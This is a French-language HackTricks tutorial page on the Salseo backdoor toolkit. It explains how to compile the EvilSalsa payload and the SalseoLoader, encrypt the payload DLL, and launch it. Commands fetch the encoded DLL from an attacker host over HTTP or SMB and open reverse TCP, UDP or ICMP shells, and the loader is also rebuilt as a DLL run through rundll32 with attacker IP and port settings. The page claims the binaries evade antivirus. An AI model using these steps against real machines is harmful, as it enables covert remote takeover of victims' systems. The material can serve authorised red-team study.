# Salseo

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}

## Compilation des binaires

Téléchargez le code source depuis GitHub et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.

Compilez ces projets pour l'architecture de la machine Windows où vous allez les utiliser (si Windows prend en charge x64, compilez-les pour cette architecture).

Vous pouvez **sélectionner l'architecture** dans Visual Studio dans l'onglet **"Build"** à gauche dans **"Platform Target".**

(\*\*Si vous ne trouvez pas ces options, cliquez sur **"Project Tab"** puis sur **"\<Nom du Projet> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Ensuite, compilez les deux projets (Build -> Build Solution) (À l'intérieur des journaux, le chemin de l'exécutable apparaîtra) :

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Préparer la porte dérobée

Tout d'abord, vous devrez encoder le **EvilSalsa.dll.** Pour ce faire, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, maintenant vous avez tout ce dont vous avez besoin pour exécuter tout le truc Salseo : le **EvilDalsa.dll encodé** et le **binaire de SalseoLoader.**

**Téléchargez le binaire SalseoLoader.exe sur la machine. Ils ne devraient pas être détectés par un quelconque AV...**

## **Exécuter la porte dérobée**

### **Obtenir un shell TCP inversé (téléchargement du dll encodé via HTTP)**

N'oubliez pas de démarrer un nc en tant qu'auditeur de shell inversé et un serveur HTTP pour servir le evilsalsa encodé.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtenir un shell inversé UDP (téléchargement d'un dll encodé via SMB)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inversé, et un serveur SMB pour servir le evilsalsa encodé (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtenir un shell inverse ICMP (dll encodée déjà présente sur la victime)**

**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inverse. Téléchargez :** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Désactiver les réponses ICMP :**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Exécuter le client :
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### À l'intérieur de la victime, exécutons la chose salseo :
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilation de SalseoLoader en tant que DLL exportant la fonction principale

Ouvrez le projet SalseoLoader en utilisant Visual Studio.

### Ajoutez avant la fonction principale: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installez DllExport pour ce projet

#### **Outils** --> **Gestionnaire de packages NuGet** --> **Gérer les packages NuGet pour la solution...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir), et appuyez sur Installer (et acceptez la fenêtre contextuelle)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Dans le dossier de votre projet sont apparus les fichiers: **DllExport.bat** et **DllExport\_Configure.bat**

### **Désinstaller DllExport**

Appuyez sur **Désinstaller** (oui, c'est bizarre mais faites-moi confiance, c'est nécessaire)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Quittez Visual Studio et exécutez DllExport\_configure**

Simplement **quittez** Visual Studio

Ensuite, allez dans votre **dossier SalseoLoader** et **exécutez DllExport\_Configure.bat**

Sélectionnez **x64** (si vous allez l'utiliser dans une boîte x64, c'était mon cas), sélectionnez **System.Runtime.InteropServices** (dans **Espace de noms pour DllExport**) et appuyez sur **Appliquer**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Ouvrez à nouveau le projet avec Visual Studio**

**\[DllExport]** ne devrait plus être marqué comme une erreur

![](<../.gitbook/assets/image (8) (1).png>)

### Compilez la solution

Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Propriétés de SalseoLoader --> Application --> Type de sortie = Bibliothèque de classes)

![](<../.gitbook/assets/image (10) (1).png>)

Sélectionnez **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Générer --> Cible de la plateforme = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Pour **compiler** la solution: Build --> Compiler la solution (À l'intérieur de la console de sortie, le chemin de la nouvelle DLL apparaîtra)

### Testez la DLL générée

Copiez et collez la DLL où vous souhaitez la tester.

Exécutez:
```
rundll32.exe SalseoLoader.dll,main
```
Si aucune erreur n'apparaît, vous avez probablement une DLL fonctionnelle !!

## Obtenir un shell en utilisant la DLL

N'oubliez pas d'utiliser un **serveur HTTP** et de définir un **écouteur nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

Le **CMD** (Command Prompt) est une interface en ligne de commande de Windows qui permet aux utilisateurs d'interagir avec le système d'exploitation en utilisant des commandes textuelles.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>
{% endhint %}
